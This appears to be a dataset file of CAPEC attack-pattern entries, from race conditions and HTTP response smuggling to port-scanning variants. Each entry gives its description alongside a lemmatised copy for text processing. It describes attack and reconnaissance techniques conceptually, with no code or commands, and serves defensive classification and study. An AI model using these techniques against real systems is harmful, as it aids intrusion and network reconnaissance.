CAPEC-26,Leveraging Race Conditions,"The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by ""running the race"", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.",adversary target race condition occur multiple process access manipulate resource concurrently outcome execution depend particular order access take place adversary leverage race condition run race modify resource modify normal execution flow instance race condition occur access file adversary trick system replace original file version cause system read malicious file
CAPEC-261,Fuzzing for garnering other adjacent user/sensitive data,"An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. If the server does not verify that the query matches one of the expected templates, an adversary who is allowed to send normal queries could modify their query to try to return additional information. The adversary may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation.",adversary authorize send query target send variant expect query hope modify query return information directly indirectly error log expected set query provide client application use specific query template interact server automatically fill specific field attribute server verify query match expect template adversary allow send normal query modify query try return additional information adversary know name field request modification affect server response attempt multiple plausible variant eventually trigger server response divulge sensitive information possible outcome include server crash resource consumption unexpected query cause server enter unstable state perform excessive computation
CAPEC-263,Force Use of Corrupted Files,"This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.",describe attack application force use file attacker corrupt result denial service cause application unable process corrupt file result include disabling filter access control application fail unsafe way fail lock buffer overflow possible
CAPEC-267,Leverage Alternate Encoding,An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.,adversary leverage possibility encode potentially harmful input content application application ineffective validate encoding standard
CAPEC-268,Audit Log Manipulation,"The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.",attacker inject manipulate delete forge malicious log entry log file attempt mislead audit log file cover track attack insufficient access control log file logging mechanism attacker able perform action
CAPEC-27,Leveraging Race Conditions via Symbolic Links,"This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to them. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file they will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.",attack leverage use symbolic link symlink order write sensitive file attacker create symlink link target file accessible privileged program try create temporary file symlink link actually write target file point attacker symlink link attacker insert malicious content temporary file write sensitive file symlink race occur system check temporary file exist create file attacker typically create symlink interval check creation temporary file
CAPEC-270,Modification of Registry Run Keys,"An adversary adds a new entry to the ""run keys"" in the Windows registry so that an application of their choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions. This attack is a good way for an adversary to run persistent spyware on a user's machine, such as a keylogger.",adversary add new entry run key windows registry application choosing execute user log way adversary executable operate run target system authorized user level permission attack good way adversary run persistent spyware user machine keylogger
CAPEC-271,Schema Poisoning,"An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.",adversary corrupt modify content schema purpose undermine security target schema provide structure content definition resource application replace modify schema adversary affect application handle interpret resource lead possible denial service enter unexpected state record incomplete datum
CAPEC-272,Protocol Manipulation,"An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.",adversary subvert communication protocol perform attack type attack allow adversary impersonate discover sensitive information control outcome session perform attack type attack target invalid assumption inherent implementer protocol incorrect implementation protocol vulnerability protocol
CAPEC-273,HTTP Response Smuggling,"An adversary manipulates and injects malicious content in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., server).See CanPrecede relationships for possible consequences.In the maliciously manipulated HTTP response, an adversary can add duplicate header fields that HTTP agents interpret as belonging to separate responses.The combined HTTP response ends up being parsed or interpreted as two or more HTTP responses by the targeted client HTTP agent. This allows malicious HTTP responses to bypass security controls. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.This differs from CAPEC-33 HTTP Request Smuggling, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Smuggling is an attempt to compromise aclient agent (e.g., web browser).HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest.",adversary manipulate inject malicious content form secret unauthorized http response single http response vulnerable compromised end http agent canprecede relationship possible consequence maliciously manipulate http response adversary add duplicate header field http agent interpret belong separate response combine http response end parse interpret http response target client http agent allow malicious http response bypass security control perform abuse interpretation parsing discrepancy different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc client http agent web browser path malicious http response attack usually involve misuse http header content length transfer encoding abuse discuss rfc section relate ordering precedence header attack perform modification fuzzing parameter compose request line http message attack usually result usage outdated incompatible http protocol version http agent differ http request smuggling usually attempt compromise end http agent http request message http response smuggling attempt compromise aclient agent web splitting different http smuggling fact implementation asynchronous request http splitting require embedding injection arbitrary html header content user input browser cookie ajax web browser object parameter like xmlhttprequest
CAPEC-274,HTTP Verb Tampering,"An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.",attacker modify http verb trace etc order bypass access restriction web environment allow administrator restrict access base http verb request attacker provide different http verb provide random string verb order bypass protection allow attacker access datum protect
CAPEC-275,DNS Rebinding,"An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary.Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the adversary identifies, additional attacks are possible. This attack differs from pharming attacks in that the adversary is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services.",adversary serve content ip address resolve dns server adversary control initial contact web browser similar client adversary change ip address resolve address target organization publicly accessible allow web browser examine internal address behalf adversary web browser enforce security zone base dns name order prevent cross zone disclosure information resolve ip address browser place ip address security zone allow information flow address allow adversary discover sensitive information internal network enterprise trust relationship computer target browser internal machine adversary identify additional attack possible attack differ pharming attack adversary legitimate owner malicious dns server need compromise behavior external dns service
CAPEC-276,Inter-component Protocol Manipulation,"Inter-component protocols are used to communicate between different software and hardware modules within a single computer. Common examples are: interrupt signals and data pipes. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.",inter component protocol communicate different software hardware module single computer common example interrupt signal datum pipe subvert protocol allow adversary impersonate discover sensitive information control outcome session perform attack type attack target invalid assumption inherent implementer protocol incorrect implementation protocol vulnerability protocol
CAPEC-277,Data Interchange Protocol Manipulation,"Data Interchange Protocols are used to transmit structured data between entities. These protocols are often specific to a particular domain (B2B: purchase orders, invoices, transport logistics and waybills, medical records). They are often, but not always, XML-based. Subverting the protocol can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.",datum interchange protocols transmit structured datum entity protocol specific particular domain purchase order invoice transport logistic waybill medical record xml base subvert protocol allow adversary impersonate discover sensitive information control outcome session perform attack type attack target invalid assumption inherent implementer protocol incorrect implementation protocol vulnerability protocol
CAPEC-278,Web Services Protocol Manipulation,"An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash.",adversary manipulate web service relate protocol cause web application service react differently intend perform manipulation parameter include unexpected value change call function normally restrict limited leverage pattern attack adversary able gain access datum resource normally restrict cause application service crash
CAPEC-279,SOAP Manipulation,"Simple Object Access Protocol (SOAP) is used as a communication protocol between a client and server to invoke web services on the server. It is an XML-based protocol, and therefore suffers from many of the same shortcomings as other XML-based protocols. Adversaries can make use of these shortcomings and manipulate the content of SOAP paramters, leading to undesirable behavior on the server and allowing the adversary to carry out a number of further attacks.",simple object access protocol soap communication protocol client server invoke web service server xml base protocol suffer shortcoming xml base protocol adversary use shortcoming manipulate content soap paramter lead undesirable behavior server allow adversary carry number attack
CAPEC-28,Fuzzing,"In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve their goals.",attack pattern adversary leverage fuzzing try identify weakness system fuzzing software security functionality testing method feed randomly construct input system look indication failure response input occur fuzzing treat system black box totally free preconception assumption system fuzzing help attacker discover certain assumption user input system fuzzing give attacker quick way potentially uncover assumption despite necessarily know internal system assumption turn system specially craft user input allow attacker achieve goal
CAPEC-285,ICMP Echo Request Ping,"An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss.Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the adversary is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An adversary can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc.",adversary send icmp type echo request commonly know ping order determine target system responsive request block firewall acl target host respond icmp type echo reply datagram type exchange usually refer ping ping utility present operate system ping commonly implement allow user test alive host measure round trip time measure percentage packet loss perform operation range host network know ping sweep ping utility useful small scale host discovery design rapid efficient host discovery large network block scan utility create icmp ping sweep easy perform network filter ingress icmp type message security reason method perform ping sweep develop result important recognize key security goal adversary discover ip address alive responsive host end virtually type icmp message define rfc useful adversary cycle type icmp message determine hole exist firewall configuration icmp ping sweep fail discover host protocol purpose tcp syn ack segment udp datagram send closed port etc
CAPEC-287,TCP SYN Scan,"An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its many advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed.RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered.",adversary use syn scan determine status port remote target syn scanning common type port scanning advantage drawback result novice attacker tend overly rely syn scan perform system reconnaissance scanning method primary advantage syn scanning universality speed rfc define require behavior tcp ip device incoming connection request begin syn packet turn follow syn ack packet receive service reason like tcp connect scanning syn scanning work tcp stack unlike tcp connect scanning possible scan thousand port second method type scanning usually refer half open scanning complete way handshake scanning rate extremely fast time waste complete handshake tear connection technique allow attacker scan stateful firewall common configuration tcp syn segment new connection allow port tcp syn scanning immediately detect important type port status open closed filter
CAPEC-29,Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions,"This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by ""running the race"", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.",attack target race condition occur time check state resource time use resource typical example file access adversary leverage file access race condition run race mean modify resource time target program access file time target program use file period time adversary replace modify file cause application behave unexpectedly
CAPEC-290,Enumerate Mail Exchange (MX) Records,An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.,adversary enumerate mx record give dns query type information gathering return name mail server network mail server expose internet locate dmz network protect firewall effect configuration enumerate mx record organization reveal ip address firewall possibly internal system attacker resort mx record enumeration dns zone transfer possible
CAPEC-291,DNS Zone Transfers,"An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.",attacker exploit dns misconfiguration permit zone transfer external dns server return list ip address valid hostname certain condition possible obtain zone datum organization internal network successful attacker learn valuable information topology target organization include information particular server role structure possibly information operate system run network configuration dependent behavior require search multiple dns server attempt find zone transfer allow
CAPEC-292,Host Discovery,"An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.",adversary send probe ip address determine host alive host discovery early phase network reconnaissance adversary usually start range ip address belong target network use method determine host present ip address host discovery usually refer ping scanning sonar analogy goal send packet ip address solicit response host ping virtually craft packet whatsoever provide adversary identify functional host base response attack nature usually carry ping sweep particular kind ping send range ip address
CAPEC-293,Traceroute Route Enumeration,"An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.",adversary use traceroute utility map route data flow network route target destination tracerouting allow adversary construct working topology system router list system data pass way target machine attack return varied result depend type traceroute perform traceroute work send packet target incremente time live field packet header packet traverse hop way destination ttl expire generate icmp diagnostic message identify packet expire traditional technique tracerouting involve use icmp udp firewall begin filter ingress icmp method traceroute tcp develop
CAPEC-294,ICMP Address Mask Request,"An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, ""Internet Standard Subnetting Procedure."" An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address.Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the adversary determine operating system or firmware version. Additionally, because these types of messages are rare, they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages.",adversary send icmp type address mask request gather information target networking configuration icmp address mask requests define internet standard subnetting procedure address mask request icmp type message trigger remote system respond list related subnet default gateway broadcast address icmp type address mask reply datagram gather type information help adversary plan router base attack denial service attack broadcast address modern operate system respond icmp type message security reason determine system router respond icmp address mask request help adversary determine operating system firmware version additionally type message rare easily spot intrusion detection system icmp scan tool support ip spoofing help conceal origin actual request storm similar icmp message common practice border firewall gateway configure block ingress icmp type egress icmp type message
CAPEC-295,Timestamp Request,"This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.",pattern attack leverage standard request learn exact time associate target system adversary able use timestamp return target attack time base security algorithm random number generator time base authentication mechanism
CAPEC-296,ICMP Information Request,"An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.",adversary send icmp information request host determine respond deprecate mechanism icmp information requests deprecate message type information requests originally diskless machine automatically obtain network configuration message type supersede robust protocol implementation like dhcp
CAPEC-297,TCP ACK Ping,"An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.",adversary send tcp segment ack flag set remote host purpose determine host alive tcp ping type rfc expected behavior service respond rst reset packet unsolicited ack segment exist connection send ack segment port adversary identify host alive look rst packet typically remote server respond rst regardless port open closed way tcp ack ping discover state remote port behavior case firewall look ack packet state table discard segment correspond active connection tcp ack ping discover host alive rst response packet send host
CAPEC-298,UDP Ping,"An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.",adversary send udp datagram remote host determine host alive udp datagram send open udp port response typical strategy udp ping send datagram random high port target goal solicit icmp port unreachable message target indicate host alive udp ping useful firewall configure block udp datagram send strange typically unused port like port k range additionally firewall filter incoming icmp weakness firewall rule set allow certain type icmp host unreachable port unreachable useful udp ping attempt
CAPEC-299,TCP SYN Ping,"An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN ""synchronize"" packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST ""reset"" packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response.Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present, SYN pings are preferable to ACK pings because a stateful firewall will typically drop all unsolicited ACK packets as they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. Often, an adversary will alternate between SYN and ACK pings to discover if a host is alive.",adversary use tcp syn packet means host discovery typical rfc behavior specify tcp port open host respond incoming syn synchronize packet complete stage way handshake send syn ack response port close rfc behavior respond rst reset packet behavior pe target alive send tcp syn packet port look rst ack packet response different response open closed port syn packet determine remote state port tcp syn ping useful discover alive host protect stateful firewall case specific firewall rule block access port syn packet pass firewall host solicit response open closed port stateful firewall present syn ping preferable ack ping stateful firewall typically drop unsolicited ack packet existing new connection tcp syn ping fail stateless acl firewall configure blanket filter incoming packet port firewall device discard syn packet block port adversary alternate syn ack ping discover host alive
CAPEC-3,Using Leading 'Ghost' Character Sequences to Bypass Input Filters,"Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading ""ghost"" characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.",api strip certain leading character string parameter adversary intentionally introduce leading ghost character extra character affect validity request api layer enable input pass filter process adversary input occur target api accept input datum syntactic form interpret equivalent semantic way filter account spectrum syntactic form acceptable target api
CAPEC-30,Hijacking a Privileged Thread of Execution,"An adversary hijacks a privileged thread of execution by injecting malicious code into a running process. By using a privleged thread to do their bidding, adversaries can evade process-based detection that would stop an attack that creates a new process. This can lead to an adversary gaining access to the process's memory and can also enable elevated privileges. The most common way to perform this attack is by suspending an existing thread and manipulating its memory.",adversary hijack privileged thread execution inject malicious code run process privleged thread bidding adversary evade process base detection stop attack create new process lead adversary gain access process memory enable elevated privilege common way perform attack suspend exist thread manipulate memory
CAPEC-300,Port Scanning,"An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network.Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the adversary information concerning the firewall configuration.Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four port statuses that this type of attack aims to identify: open, closed, filtered, and unfiltered. For strategic purposes it is useful for an adversary to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is requires certain scan types. Collecting this type of information tells the adversary which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An adversary often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host.",adversary use combination technique determine state port remote target service application available tcp udp networking port open communication network common service assign port number service application run arbitrary port additionally port scanning complicate potential machine possible udp tcp service goal port scanning broad identify open port adversary information concern firewall configuration depend method scanning process stealthy obtrusive easily detectable volume packet involve anomalous packet trait system logging typical port scanning activity involve send probe range port observe response port status type attack aim identify open closed filtered unfiltered strategic purpose useful adversary distinguish open port protect filter closed port protect filter make fine grained distinction require certain scan type collect type information tell adversary port attack directly attack filter evasion technique like fragmentation source port scan port unprotected firewalle host network service adversary combine technique order gain complete picture firewall filtering mechanism place host
CAPEC-301,TCP Connect Scan,"An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack.RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming (performing a full TCP connect scan against a host can take multiple days). Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports.",adversary use tcp connection attempt determine port open target system scanning process involve complete way handshake remote port report port closed handshake establish advantage tcp connect scanning work tcp ip stack rfc define tcp connection establish tear tcp connect scanning commonly involve establish connection subsequently tear involve send significant number packet port scan compare type scan tcp connect scan slow methodical type scanning cause considerable noise system log spot ids ips system tcp connect scanning detect port open complete way handshake distinguish port unfiltered service run port filter firewall contain active service significant volume packet exchange port tcp connect scanning time consume perform tcp connect scan host multiple day generally method perform comprehensive port scan reserve check short list common port
CAPEC-302,TCP FIN Scan,"An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.In addition to its relative speed in comparison with other types of scans, the major advantage a TCP FIN Scan is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link.",adversary use tcp fin scan determine port closed target machine scan type accomplish send tcp segment fin bit set packet header rfc expected behavior tcp segment state flag send open port discard segment state flag send closed port handle rst response behavior allow adversary scan closed port send certain type rule break packet sync disallow tcb detect closed port rst packet addition relative speed comparison type scan major advantage tcp fin scan ability scan stateless firewall acl filter filter configure block access port usually prevent syn packet stop attempt build connection fin packet like state ack packet tend pass device undetected fin scanning relatively stealthy packet tend blend background noise network link
CAPEC-303,TCP Xmas Scan,"An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with all possible flags set in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.In addition to its relative speed when compared with other types of scans, its major advantage is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems.",adversary use tcp xmas scan determine port closed target machine scan type accomplish send tcp segment possible flag set packet header generate packet illegal base rfc rfc expect behavior tcp segment state flag send open port discard segment state flag send closed port handle rst response behavior allow attacker scan closed port send certain type rule break packet sync disallow tcb detect closed port rst packet addition relative speed compare type scan major advantage ability scan stateless firewall acl filter filter configure block access port usually prevent syn packet stop attempt build connection xmas packet like state fin ack packet tend pass device undetected open port infer response generate distinguish open port filter port analysis instance xmas scan system protect stateful firewall indicate port open obvious rule break nature xmas scan flag intrusion prevention intrusion detection system
